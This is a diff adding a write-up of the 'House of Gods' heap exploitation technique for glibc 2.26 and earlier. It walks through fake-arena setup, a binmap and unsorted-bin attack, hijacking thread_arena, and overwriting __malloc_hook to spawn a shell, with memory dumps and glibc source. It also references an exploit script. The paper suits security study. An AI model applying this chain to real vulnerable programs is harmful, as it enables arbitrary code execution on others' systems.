@@ -1,0 +1,900 @@
+<============================== HOUSE OF GODS ==============================>
+
+                       *****                            
+                      ***&&&*            _, .--.  
+                     *&&&&&&*           (  / (  '-.            
+                    *&&&&&&&*           .-=-.    ) -.      
+                 _&*********           /   (  .' .   \                                
+                | |                    \ ( ' ,_) ) \_/ 
+            *-------*                    (_ , /\  ,_/
+           /         \                    '--\ `\--` 
+          *___________*                      _\ _\
+          |           |  House of Gods       `\ \ 
+          |     _     |  == by milo           _\_\
+          |    | |    |                       `\\
+          |    | |    |                         \\
+    ========================================-.'.`\.'.-==========
+
+=== Table of Contents ===
+
+1 Abstract...........................................................
+2 Technical Requirements.............................................
+3 The Exploitation Concepts..........................................
+    3.1 Stage 0 - Preparation Phase..................................
+    3.2 Stage 1 - Attacking the binmaps..............................
+    3.3 Stage 2 - Hijacking the arena................................
+    3.4 Stage 3 - Arbitrary code execution...........................
+4 Proof of Concept...................................................
+5 Conclusion.........................................................
+6 References.........................................................
+
+<--[ 1. Abstract ]-->
+
+House of Gods is a heap exploitation technique developed for binaries 
+linked against the GNU C Library version <= 2.26 (no tcache). Although not the most
+recent version, it is, in my opinion, still a very interesting technique.
+
+This paper demonstrates how to hijack the arena with only 8 allocations and a single
+write-after-free bug on an unsorted chunk. After that, two more allocations are needed 
+in order to execute arbitrary code.
+
+The exploit was successfully tested against 
+
+    - glibc-2.23
+    - glibc-2.24
+    - glibc-2.25
+    - glibc-2.26 (compiled without tcache)
+
+<--[ 2. Technical Requirements ]-->
+
+Following requirements are mandatory in order to launch the House of Gods technique
+
+    - glibc version <= 2.26 (2.26 only if compiled without tcache)
+    - atleast 10 allocations of arbitrary size
+    - control over atleast 5 quadwords of a chunk's userdata
+    - a single write-after-free bug on an unsorted-chunk
+    - heap and libc leak
+
+<--[ 3. The Exploitation Concepts ]-->
+
+House of Gods can be divided into four stages,
+
+    Stage 0: Preparation Phase
+    Stage 1: Attacking the binmaps
+    Stage 2: Hijacking the arena
+    Stage 3: Arbitrary code execution
+
+The following sections will take an in-depth look at the internals of this exploit.
+
+<--[ 3.1 Preparation Phase ]-->
+
+The purpose of the preparation phase is to allocate and setup a (partial) fake-arena. Usually, 
+we could omit this phase by placing the fake-arena within one of the future chunks. But, in my 
+opinion, the exploit is more readable if we allocate a separate chunk for our arena. That is also
+why we will end up with a total of 11 allocations instead of the promised 10 allocations. 
+
+However, let us start...
+
+Stage 3, the last stage, is going to target the __malloc_hook in order to drop a shell. We already
+know that there is a fake fastchunk overlapping the __malloc_hook, residing at __malloc_hook-0x23
+
+    0x00007f5ca76f6bcd 5ca76f2f00000000 000000000000007f
+    0x00007f5ca76f6bdd 5ca73cc460000000 5ca73cc8c000007f
+    0x00007f5ca76f6bed 000000000000007f 0000000000000000
+    0x00007f5ca76f6bfd 0000000000000000 0001409100000000
+
+We can preload the head of the 0x70-fastbin of our fake-arena with the address of this fakechunk.
+This leads to malloc returning a pointer to __malloc_hook-0x23 as soon as we make a request
+for a 0x70-chunk.
+
+Let us inspect the first eight quadwords of the arena layout
+
+    struct malloc_state {
+
+        +0x0000 mutex                : __libc_lock_t
+        +0x0004 flags                : int
+        +0x0008 fastbinsY            : mfastbinptr [10]
+
+        [...]
+    }
+
+    0x00007f5ca76f6c00 0000000000000000 0000000000000000 <- mutex+flags, 0x20-fastbin
+    0x00007f5ca76f6c10 0000000000000000 0000000000000000
+    0x00007f5ca76f6c20 0000000000000000 0000000000000000
+    0x00007f5ca76f6c30 0000000000000000 0000000000000000 <- 0x70-fastbin, 0x80-fastbin
+
+We don't need to fake the whole arena in order to allocate from the fastbins. In fact, it is enough
+to setup only the first seven quadwords of our arena (up to the 0x70-fastbin). Besides that, we have
+to ensure, that its mutex and flags are in tact, i.e. no locks or corruption bits.
+
+So in summary,
+
+    - fake_arena.mutex        = 0x0
+    - fake_arena.flags        = 0x0
+    - fake_arena.fastbinsY[5] = __malloc_hook - 0x23
+
+A valid partial fake-arena should look similar to this
+
+    0x0000000001409000 0000000000000000 0000000000000031 <- mutex+flags, 0x20-fastbin
+    0x0000000001409010 0000000000000000 0000000000000000  
+    0x0000000001409020 0000000000000000 0000000000000000
+    0x0000000001409030 00007f5ca76f6bcd 0000000000000091 <- 0x70-fastbin, 0x80-fastbin
+
+Now that the preparation phase is over, it is time to move on to the core
+of this exploitation technique.
+
+<--[ 3.2 Attacking the binmaps ]-->
+
+Each arena has a member called binmap
+
+    struct malloc_state
+    {
+      [...]
+
+      /* Bitmap of bins */
+      unsigned int binmap[BINMAPSIZE];
+
+      /* Linked list */
+      struct malloc_state *next;
+
+      /* Linked list for free arenas.  Access to this field is serialized
+         by free_list_lock in arena.c.  */
+      struct malloc_state *next_free;
+
+      /* Number of threads attached to this arena.  0 if the arena is on
+         the free list.  Access to this field is serialized by
+         free_list_lock in arena.c.  */
+      INTERNAL_SIZE_T attached_threads;
+
+      /* Memory allocated from the system in this arena.  */
+      INTERNAL_SIZE_T system_mem;
+      INTERNAL_SIZE_T max_system_mem;
+    };
+
+This binmap serves as a bitmap for occupied bins so that malloc can quickly
+lookup these bins and recycle a chunk for allocation.
+
+Everytime an unsorted chunk gets placed into its appropiate smallbin/largebin,
+malloc marks the binmap via following macro
+
+    mark_bin(m, i) ((m)->binmap[idx2block (i)] |= idx2bit (i))
+
+and after resolving the macro (we start to regret our decisions)
+
+    ((m)->binmap[ ((i) >> 5) ] |= ((1U << ((i) & ((1U << 5) - 1)))))
+
+So, we should be able to calculate the resulting binmap value for a given chunksize.
+But why should we do this after all ? 
+
+Well, let's take a look at the raw memory of the main_arena
+
+                                         [1]        [0]
+    0x00007ffff7dd3450 00007ffff7dd3438 0000000000000000 <- binmap[0, 1] (fake sizefield)
+    0x00007ffff7dd3460 0000000000000000 00007ffff7dd2c00 <- next (fake bk pointer)
+    0x00007ffff7dd3470 0000000000000000 0000000000000001
+    0x00007ffff7dd3480 0000000000021000 0000000000021000 <- system_mem, max_system_mem
+
+The first quadword of the binmap can be repurposed as fake sizefield and the
+main_arena's next pointer naturally points to the start of the main_arena 
+(atleast right after initialization). Thus providing one with a bk pointer to
+a write-able page.
+
+And now let's recall the unsorted-bin scan and its sanity-checks for unsorted chunks. The first
+check is a test on a chunk's sizefield. This check aborts the process if chunksize <= 2 * SIZE_SZ 
+or chunksize > av->system_mem
+
+    if (__builtin_expect (chunksize_nomask (victim) <= 2 * SIZE_SZ, 0) ||
+        __builtin_expect (chunksize_nomask (victim) > av->system_mem, 0))
+            malloc_printerr (check_action, "malloc(): memory corruption", chunk2mem (victim), av);
+
+The second test is an implicit one. In order to safely pass the partial unlinking without segfaulting, 
+one needs to forge a bk pointer to an address within a write-able page. Also there is no need to control
+bck->fd, since we are exploiting glibc <= 2.26.
+
+    /* remove from unsorted list */
+    unsorted_chunks (av)->bk = bck;
+    bck->fd = unsorted_chunks (av);
+
+Both requirements can be satisfied if we craft a valid fake sizefield by simply allocating and 
+freeing chunks. For example, binning a 0x90-chunk results in a 0x200-sizefield
+
+    0x00007ffff7dd3450 00007ffff7dd3438 0000000000000200 <- valid sizefield
+    0x00007ffff7dd3460 0000000000000000 00007ffff7dd2c00 <- valid bk pointer
+    0x00007ffff7dd3470 0000000000000000 0000000000000001
+    0x00007ffff7dd3480 0000000000021000 0000000000021000
+
+Now this binmap-chunk can be linked into the unsorted-bin via an use-after-free bug.
+
+                          (exact-fit)
+     ------------        --------------
+    | main_arena | <--- | binmap-chunk | <----+
+     ------------   bk   --------------       | bk (corrupted)
+                                              |
+                                        ----------- 
+                            size: 0x90 | UAF chunk | (bin this to forge sizefield)
+                                        -----------
+                                            | ^ 
+                                         fd | |
+                         --------------  <--- |
+                        | unsorted-bin | -----+ bk
+                         --------------
+
+Once linked into the unsorted-bin, the binmap chunk can be allocated as an exact fit, allowing
+us to overwrite sensitive data within the main_arena. We're going to allocate this chunk at the end
+of this stage and use it later in stage 2 to overwrite sensitive data. But for now we should focus 
+on fixing the unsorted-bin...
+
+We wont survive another unsorted-bin scan, since the chunk overlapping the main_arena has neither 
+a valid sizefield nor a valid bk pointer
+
+    0x00007ffff7dd2c00 0000000000000000 0000000000000000 <- sizefield  (< 2 * SIZE_SZ)
+    0x00007ffff7dd2c10 00007fd27ea0bc58 0000000000000000 <- bk pointer (= NULL)
+    0x00007ffff7dd2c20 0000000000000000 0000000000000000
+    0x00007ffff7dd2c30 0000000000000000 0000000000000000
+
+So let us enhance our "chain". First, take a look at the malloc_state memory layout
+
+    0x00007ffff7dd2c00 0000000000000000 0000000000000000 <- 0x20-fastbins (sizefield)
+    0x00007ffff7dd2c10 00007fd27ea0bc58 0000000000000000 <- 0x30-fastbins, 0x40-fastbins (bk)
+    0x00007ffff7dd2c20 0000000000000000 0000000000000000
+    0x00007ffff7dd2c30 0000000000000000 0000000000000000
+
+We can create a valid sizefield and valid bk pointer by binning fastchunks into the
+0x20-fastbins and 0x40-fastbins. Remember, we are able to tamper with main_arena.system_mem,
+so passing the size sanity-check within the unsorted-bin should not be a problem at all. That is 
+why we are able to abuse a heap pointer as sizefield. 
+
+Once both fastchunks are free'd, the main_arena should look similar to this
+
+    0x00007ffff7dd2c00 0000000000000000 00000000008580d0 <- 0x20-fastbins (sizefield)
+    0x00007ffff7dd2c10 00007fd27ea0bc58 0000000000858090 <- 0x30-fastbins, 0x40-fastbins (bk)
+    0x00007ffff7dd2c20 0000000000000000 0000000000000000
+    0x00007ffff7dd2c30 0000000000000000 0000000000000000
+
+and should pass all incoming checks. Furthermore the next victim chunk (bk) will be our
+recently free'd 0x40-fastchunk. Freeing fastchunks will clear the fd pointer but spare
+the bk pointer. We can abuse this fact to redirect the unsorted-bin one more time to
+a chunk we fully control (called INTM, intermediate chunk).
+
+                                             (exact-fit)
+     -----------        ------------        --------------
+    | 0x40-fast | <--- | main_arena | <--- | binmap-chunk | <---+
+     -----------        ------------   bk   --------------      | bk (corrupted)
+        | bk                                                    |
+        v                                                       |
+       ------                                            ----------- 
+      | INTM |                                          | UAF chunk | (bin this to forge sizefield)
+       ------                                            -----------
+                                                              | ^ 
+                                                           fd | |
+                                           --------------  <--- |
+                                          | unsorted-bin | -----+ bk
+                                           --------------
+And after allocating the binmap chunk
+
+     ------        -----------
+    | INTM | <--- | 0x40-fast | <---+
+     ------   bk   -----------      | bk
+                                    |
+                                    |
+                             ------------ 
+                            | main_arena |
+                             ------------
+                                  | ^ 
+                               fd | |
+               --------------  <--- |
+              | unsorted-bin | -----+ bk
+               --------------
+
+And that is a binmap-attack. We successfully gained control over 
+
+    -> main_arena.next
+    -> main_arena.next_free
+    -> main_arena.attached_threads
+    -> main_arena.system_mem
+    -> main_arena.max_system_mem
+    -> and even more, depending on the binmap sizefield...
+
+Additionally, we managed to fix the unsorted-bin, which is vital to the next stage. 
+
+<--[ 3.3 Hijacking the arena ]-->
+
+So how can we take advantage of the ability to overwrite the arena's next pointer ? Here is
+a small diagram depicting how malloc uses the next pointer to chain multiple arenas
+
+               main_arena
+    +-----------------------------+
+    | flags, mutex |              |
+    |-----------------------------|
+    |                             |
+    |                             |                 n-th arena           
+    |-----------------------------|      +-----------------------------+
+    |              |     next     | ---> | flags, mutex |              |
+    |-----------------------------|      |-----------------------------|
+    |                             |      |                             |
+    +-----------------------------+      |                             |
+                                         |-----------------------------|
+                                         |              |     next     | ---> [...]
+                                         |-----------------------------|
+                                         |                             |
+                                         +-----------------------------+
+
+If malloc creates a new arena, it links it into a circular singly-linked list. This list
+is a LIFO structure with the main_arena as head. A new arena will be linked in between
+the main_arena and the n-th arena (last arena created).
+
+However, there is a limit to how many arenas can be created. This limit is highly machine dependent.
+To be more precise, it depends on the total number of processors configured by the operating system.
+
+    static mstate internal_function arena_get2(size_t size, mstate avoid_arena)
+    {
+      [...]
+
+      int n = __get_nprocs ();
+
+      if (n >= 1)
+        narenas_limit = NARENAS_FROM_NCORES (n);
+      else
+        /* We have no information about the system. Assume two cores. */
+        narenas_limit = NARENAS_FROM_NCORES (2);
+
+      [...]
+
+      repeat:;
+      size_t n = narenas;
+
+      /* NB: the following depends on the fact that (size_t)0 - 1 is a
+         very large number and that the underflow is OK.  If arena_max
+         is set the value of arena_test is irrelevant.  If arena_test
+         is set but narenas is not yet larger or equal to arena_test
+         narenas_limit is 0.  There is no possibility for narenas to
+         be too big for the test to always fail since there is not
+         enough address space to create that many arenas.  */
+
+      if (__glibc_unlikely (n <= narenas_limit - 1))
+      {
+        if (catomic_compare_and_exchange_bool_acq (&narenas, n + 1, n))
+          goto repeat;
+
+        a = _int_new_arena (size);
+
+        if (__glibc_unlikely (a == NULL))
+          catomic_decrement (&narenas);
+      }
+      else
+        a = reused_arena (avoid_arena);
+
+      [...]
+    }
+
+If malloc reaches the upper limit of active arenas (narenas > narenas_limit - 1), it will stop 
+creating new ones and instead try to reuse existing arenas by iterating over the arena list
+and returning the first non-corrupted, non-locked arena.
+
+    static mstate reused_arena(mstate avoid_arena)
+    {
+      mstate result;
+      static mstate next_to_use;
+
+      if (next_to_use == NULL)
+        next_to_use = &main_arena;
+
+      /* Iterate over all arenas (including those linked from free_list). */
+      result = next_to_use;
+
+      do {
+
+        if (!arena_is_corrupt (result) && !__libc_lock_trylock (result->mutex))
+          goto out;
+
+        result = result->next;
+
+      } while (result != next_to_use);
+
+      [...]
+
+      out:
+
+      [...]
+
+      return result;
+    }
+
+So that's where it starts to get interesting. We are in control of main_arena.next and the traversal 
+starts at the main_arena. What if we can trick the reused_arena() function to return our main_arena.next 
+pointer ? Exactly that is the end goal of stage 2 of the House of Gods technique.
+
+In order to reach the reused_arena() function, we need to somehow exceed the upper limit of 
+total arenas. There are actually multiple ways to achieve this. We are going to focus on the 
+narenas variable...
+
+The global narenas variable stores the total number of arenas currently inuse. So if we manage
+to manipulate this variable by launching an unsorted-bin attack against narenas-0x10, we could overwrite
+it with the address of the unsorted-bin, which should be large enough to exceed narenas_limit.
+
+So let us extend our previous unsorted-bin chain one more time, by linking the intermediate chunk (INTM)
+with narenas-0x10
+
+                         (exact fit)
+     --------------        ------        -----------
+    | narenas-0x10 | <--- | INTM | <--- | 0x40-fast | <---+
+     --------------   bk   ------   bk   -----------      | bk
+                                                          |
+                                                          |
+                                                   ------------ 
+                                                  | main_arena |
+                                                   ------------
+                                                        | ^ 
+                                                     fd | |
+                                     --------------  <--- |
+                                    | unsorted-bin | -----+ bk
+                                     --------------
+
+Now is the right time to tamper with the previously allocated binmap chunk. We need to adjust
+atleast two values within the main_arena
+
+    1. main_arena.next, in order to inject our fake arena
+    2. main_arena.system_mem, in order to bypass size sanity-checks for the main_arena chunk
+
+For example we could write following values to the binmap chunk
+
+    main_arena.next             = fake_arena
+    main_arena.next_free        = 0x0000000000000000
+    main_arena.attached_threads = 0x0000000000000001
+    main_arena.system_mem       = 0xffffffffffffffff
+    main_arena.max_system_mem   = 0xffffffffffffffff
+
+And now, let us initiate the unsorted-bin attack by allocating the INTM chunk as exact fit.
+
+                   --------------
+                  | narenas-0x10 |
+                   --------------
+                        | ^ 
+                     fd | |
+     --------------  <--- |
+    | unsorted-bin | -----+ bk
+     --------------
+
+The narenas variable is now set to the address of the unsorted-bin, and we are finally able 
+to branch into the reused_arena() function.
+
+    static mstate internal_function arena_get2(size_t size, mstate avoid_arena)
+    {
+      [...]
+
+      size_t n = narenas; //<<<< narenas = &unsorted-bin = &main_arena.top
+
+      if (__glibc_unlikely (n <= narenas_limit - 1)) //<<<< false
+      {
+        if (catomic_compare_and_exchange_bool_acq (&narenas, n + 1, n))
+          goto repeat;
+
+        a = _int_new_arena (size);
+
+        if (__glibc_unlikely (a == NULL))
+          catomic_decrement (&narenas);
+      }
+      else
+        a = reused_arena (avoid_arena);
+
+      [...]
+    }
+
+But how do we get there in the first place ? When does malloc call arena_get2() ? 
+In order to answer this question, we need to investigate the __libc_malloc() function...
+
+    void* __libc_malloc(size_t bytes)
+    {
+      [...]
+
+      arena_get (ar_ptr, bytes);
+      victim = _int_malloc (ar_ptr, bytes);
+
+      /* Retry with another arena only if we were able to find a usable arena
+      before.  */
+
+      if (!victim && ar_ptr != NULL)
+      {
+        LIBC_PROBE (memory_malloc_retry, 1, bytes);
+        ar_ptr = arena_get_retry (ar_ptr, bytes);
+        victim = _int_malloc (ar_ptr, bytes);
+      }
+
+      [...]
+    }
+
+Before malloc even tries to service a memory request, it needs to find an available arena. 
+arena_get() is defined as a macro
+
+    #define arena_get(ptr, size) do {   \
+                                        \
+              ptr = thread_arena;       \
+              arena_lock (ptr, size);   \
+                                        \
+            } while (0)
+
+First, malloc tries to acquire the last successfully locked arena (thread_arena) by trying
+to lock its mutex again with arena_lock(ptr, size)
+
+    #define arena_lock(ptr, size) do {            \
+                                                  \
+              if (ptr && !arena_is_corrupt (ptr)) \
+                __libc_lock_lock (ptr->mutex);    \
+              else                                \
+                ptr = arena_get2 ((size), NULL);  \
+                                                  \
+            } while (0)
+
+There are two possible ways to reach the arena_get2() call
+
+    1. ptr = thread_arena = NULL
+    2. arena_is_corrupt(ptr) = true
+
+Option 1 does not seem too promising, since we have no control over thread_arena. Option 2 was
+target of the very first revision of this technique and it did work out pretty well. However,
+there is a better way with less allocations. So, let's head back to the __libc_malloc() function
+for further investigation
+
+    void* __libc_malloc(size_t bytes)
+    {
+      [...]
+
+      arena_get (ar_ptr, bytes); //<<<< not an option
+      victim = _int_malloc (ar_ptr, bytes);
+
+      /* Retry with another arena only if we were able to find a usable arena
+      before.  */
+
+      if (!victim && ar_ptr != NULL)
+      {
+        LIBC_PROBE (memory_malloc_retry, 1, bytes);
+        ar_ptr = arena_get_retry (ar_ptr, bytes); //<<<< maybe this one ?
+        victim = _int_malloc (ar_ptr, bytes);
+      }
+
+      [...]
+    }
+
+There is an interesting function call located right after malloc's first try to allocate memory 
+via _int_malloc(). Let's take a closer look at arena_get_retry()
+
+    static mstate arena_get_retry(mstate ar_ptr, size_t bytes)
+    {
+      LIBC_PROBE (memory_arena_retry, 2, bytes, ar_ptr);
+
+      if (ar_ptr != &main_arena)
+        {
+          __libc_lock_unlock (ar_ptr->mutex);
+
+          /* Don't touch the main arena if it is corrupt.  */
+          if (arena_is_corrupt (&main_arena))
+            return NULL;
+
+          ar_ptr = &main_arena;
+          __libc_lock_lock (ar_ptr->mutex);
+        }
+      else
+        {
+          __libc_lock_unlock (ar_ptr->mutex);
+          ar_ptr = arena_get2 (bytes, ar_ptr); //<<<< our goal
+        }
+
+      return ar_ptr;
+    }
+
+If the currently active arena is the main_arena, arena_get_retry() will call arena_get2(), which
+is exactly what we want. Luckily, we meet this condition. Our currently active arena
+is indeed the main_arena. Now we only have to figure out how to reach arena_get_retry()
+
+    void* __libc_malloc(size_t bytes)
+    {
+      [...]
+
+      victim = _int_malloc (ar_ptr, bytes);
+
+      if (!victim && ar_ptr != NULL)
+      {
+        LIBC_PROBE (memory_malloc_retry, 1, bytes);
+        ar_ptr = arena_get_retry (ar_ptr, bytes); //<<<< maybe this one ?
+        victim = _int_malloc (ar_ptr, bytes);
+      }
+
+      [...]
+    }
+
+We have to ensure that both conditions are met
+
+    1. victim = _int_malloc() = NULL
+    2. ar_ptr != NULL
+
+The local variable ar_ptr holds the currently used arena, which is the main_arena in our 
+case. Thus the second condition won't be a problem. The first condition requires a failure
+within the _int_malloc() function. Let's see if there is a way...
+
+    static void* _int_malloc(mstate av, size_t bytes)
+    {
+      [...]
+
+      checked_request2size (bytes, nb);
+
+      if (__glibc_unlikely (av == NULL))
+        {
+          void *p = sysmalloc (nb, av);
+
+          if (p != NULL)
+            alloc_perturb (p, bytes);
+
+          return p;
+        }
+
+      [...]
+    }
+
+The purpose of the checked_request2size() macro is to pad and align the chunksize
+requested by the user. Before doing so, it checks for potential wrap-arounds. If the size
+is large enough to wrap-around zero when padded and aligned, it will return NULL instead of 
+servicing the request.
+
+    #define checked_request2size(req, sz) \
+                                          \
+      if (REQUEST_OUT_OF_RANGE (req)) {   \
+                                          \
+          __set_errno (ENOMEM);           \
+          return 0;                       \
+        }                                 \
+                                          \
+      (sz) = request2size (req);          \
+
+Let's disassemble the start of _int_malloc() in order to find this upper limit
+
+    000000000007e470 <_int_malloc>:
+        7e470:   41 57                   push   r15
+        7e472:   41 56                   push   r14
+        7e474:   41 55                   push   r13
+        7e476:   41 54                   push   r12
+        7e478:   55                      push   rbp
+        7e479:   53                      push   rbx
+        7e47a:   48 83 ec 58             sub    rsp, 0x58
+        7e47e:   48 83 fe bf             cmp    rsi, 0xffffffffffffffbf
+        7e482:   0f 87 0d 08 00 00       ja     7ec95 <_int_malloc+0x825>
+
+The second argument of _int_malloc(), the requested size, is stored in rsi. 
+If it's greater than 0xffffffffffffffbf, the function returns NULL. So if we make
+a call to malloc with
+
+    malloc(0xffffffffffffffbf + 1);
+
+the first attempt to service this request will fail and return NULL.
+
+    void* __libc_malloc(size_t bytes)
+    {
+      [...]
+
+      arena_get (ar_ptr, bytes); //<<<< not an option
+      victim = _int_malloc (ar_ptr, bytes);
+
+      [...]
+    }
+
+Right after that, malloc will retry the allocation, but this time with another arena.
+
+    void* __libc_malloc(size_t bytes)
+    {
+      [...]
+
+      /* Retry with another arena only if we were able to find a usable arena
+      before.  */
+
+      if (!victim && ar_ptr != NULL)
+      {
+        LIBC_PROBE (memory_malloc_retry, 1, bytes);
+        ar_ptr = arena_get_retry (ar_ptr, bytes); //<<<< maybe this one ?
+        victim = _int_malloc (ar_ptr, bytes);
+      }
+
+      [...]
+    }
+
+This in turn, will trigger a call to arena_get_retry(), arena_get2() and finally reused_arena().
+The reused_arena() function will then iterate over all arenas (starting with the main_arena), including 
+our fake-arena, which we previously injected by tampering with the main_arena.next pointer. It will 
+return the first non-corrupted, non-locked arena it finds
+
+    static mstate reused_arena(mstate avoid_arena)
+    {
+
+      [...]
+
+      if (next_to_use == NULL)
+        next_to_use = &main_arena;
+
+      /* Iterate over all arenas (including those linked from free_list). */
+      result = next_to_use;
+
+      do {
+
+        if (!arena_is_corrupt (result) && !__libc_lock_trylock (result->mutex))
+          goto out;
+
+        result = result->next;
+
+      } while (result != next_to_use);
+
+      [...]
+
+      out:
+
+      [...]
+
+      thread_arena = result;
+      next_to_use = result->next;
+
+      return result;
+    }
+
+Sadly, the main_arena is neither corrupted nor locked, so the first call to reused_arena()
+returns the main_arena instead of our fake-arena. But as we can see, the next_to_use variable
+dictates the start of traversal
+
+    static mstate reused_arena(mstate avoid_arena)
+    {
+      [...]
+
+      if (next_to_use == NULL)
+        next_to_use = &main_arena;
+
+      /* Iterate over all arenas (including those linked from free_list). */
+      result = next_to_use;
+
+      [...]
+    }
+
+And here we assign result->next to the next_to_use variable. 
+
+    static mstate reused_arena(mstate avoid_arena)
+    {
+      [...]
+
+      thread_arena = result;
+      next_to_use = result->next;
+
+      return result;
+    }
+
+Since result is equals to main_arena upon first call, next_to_use will be equals to our 
+fake-arena. We can simply make another request for an invalid chunksize. This triggers
+a second call to reused_arena(), but this time it will return the fake-arena.
+
+    malloc(0xffffffffffffffbf + 1); // first call
+
+        result =                 main_arena
+        next_to_use   +-----------------------------+
+        ------------> | flags, mutex |              |
+                      |-----------------------------|
+                      |                             |
+                      |                             |                        fake_arena           
+                      |-----------------------------|  corrupted   +-----------------------------+
+                      |              |     next     | -----------> | flags, mutex |              |
+                      |-----------------------------|              |-----------------------------|
+                      |                             |              |                             |
+                      +-----------------------------+              |                             |
+                                                                   |-----------------------------|
+                                                                   |              |     next     | ---> ??
+                                                                   |-----------------------------|
+                                                                   |                             |
+                                                                   +-----------------------------+
+
+        thread_arena = result       = next_to_use      = &main_arena
+        next_to_use  = result->next = main_arena->next = &fake_arena
+
+    malloc(0xffffffffffffffbf + 1); // second call
+
+        result =                 fake_arena
+        next_to_use   +-----------------------------+
+        ------------> | flags, mutex |              |
+                      |-----------------------------|
+                      |                             |
+                      |                             |           
+                      |-----------------------------|
+                      |              |     next     | ---> ??
+                      |-----------------------------|
+                      |                             |
+                      +-----------------------------+
+
+        thread_arena = result       = next_to_use      = &fake_arena
+        next_to_use  = result->next = fake_arena->next = ??
+
+That's it. We hijacked thread_arena with only 9 allocations. Now it is time to move on to the
+final stage of the exploit. It is probably the easiest part of the House of Gods technique.
+
+<--[ 3.4 Arbitrary code execution ]-->
+
+Remember the preparation phase ? We prepared a partial arena and preloaded the 0x70-fastbin
+with a fakechunk starting at __malloc_hook-0x23.
+
+    0x0000000001409000 0000000000000000 0000000000000031 <- mutex+flags, 0x20-fastbin
+    0x0000000001409010 0000000000000000 0000000000000000  
+    0x0000000001409020 0000000000000000 0000000000000000
+    0x0000000001409030 00007f5ca76f6bcd 0000000000000091 <- 0x70-fastbin, 0x80-fastbin
+
+We can simply request a 0x70-chunk. This request will be serviced from the fastbins and
+malloc will return a pointer to __malloc_hook-0x23, which we can use to overwrite the __malloc_hook
+with a custom handler, for example the system() function. We can trigger the hook by making
+another call to malloc(), this time with the address of "/bin/sh" as argument.
+
+    malloc(0x68);
+    malloc(0x7fca39f978d5);
+
+We finally made it. We performed the House of Gods to hijack the arena and drop a shell with only 
+11 allocations, 10 if we were greedy with the allocations.
+
+Before we jump to the conclusion, here are some important notes on the arena we hijacked
+
+    - chunks that are returned by our arena must have the IS_MMAPED flag set, otherwise
+      the process would most likely result in a segfault when trying to locate the arena's
+      heap_info.ar_ptr pointer. This can be fixed, by placing a heap_info structure at the
+      bottom of our fake-arena. But this would require multiple huge allocations in order to
+      properly align the structure.  
+
+    - make sure to fake the arena up to the .system_mem variable if you are planning to make 
+      requests that can not be serviced from the fastbins
+
+    - your fake-arena does not always have to return a chunk in order to gain arbitrary code
+      execution. You can also preload the unsorted-bin and a couple smallbins/largebins to 
+      forge a series of arbitrary writes and perform an attack against libio's filestreams   
+
+<--[ 4. Proof of Concept ]-->
+
+The proof of concept consists of a very simple vulnerable binary written in C and of 
+course the actual exploit, written in Python. This exploit script performs the house of gods 
+technique in order to obtain a shell. You can find all relevant files within this repository.
+
+In order to execute the exploit type
+
+    $ ./patch.sh && ./exploit.py
+
+Have fun experimenting :)
+
+<--[ 5. Conclusion ]-->
+
+House of Gods has its advantages but also certainly some disadvantages.
+
+    Advantages:
+
+        - only a single WAF bug has to be abused to initiate the attack
+        - only 8 allocations needed to hijack the thread_arena
+        - arbitrary code execution after 10 allocations
+        - can be used in scenarios without access to a WAF on fastchunks
+        - it is a fun way to exploit the heap :)
+
+    Disadvantages:
+
+        - does not work with tcache
+        - does not target recent versions (only glibc <= 2.26) 
+        - probably overkill if a WAF bug on fastchunks exists
+        - requires allocation of arbitrary chunksizes
+
+And here are the key takeaways of this technique
+
+    (1) binmaps can be abused as fake sizefield by binning chunks. This is especially
+        interesting because the corresponding fake bk/fd pointer (depending on glibc version)
+        naturally points to the start of the main_arena, thus forming a valid pointer
+        to a writeable page. Allocating this fakechunk might lead to an overwrite of
+        main_arena.sysetm_mem, effectively bypassing some of the size sanity checks
+        within malloc. Or this could enable one to takeover main_arena.next and/or
+        main_arena.next_free
+
+    (2) controlling main_arena.next comes with benefits and the arena can be hijacked if one
+        manages to reach the reused_arena() function
+
+    (3) the whole arena_get codepath seems to be a bit unprotected, even in the latest
+        versions of glibc (2.35 by the time of writing this)
+
+    (4) if malloc fails to service a request due to invalid request-size, it will start a
+        second attempt with another arena. This seems to be odd behaviour since it was not the
+        arena's fault. So the second attempt will fail, too, no matter which arena malloc picks.
+
+<--[ 6. References ]-->
+
+[0] ASCII-Art: https://www.oocities.org/spunk1111/nature.htm
+[1] https://elixir.bootlin.com/glibc/glibc-2.26/source
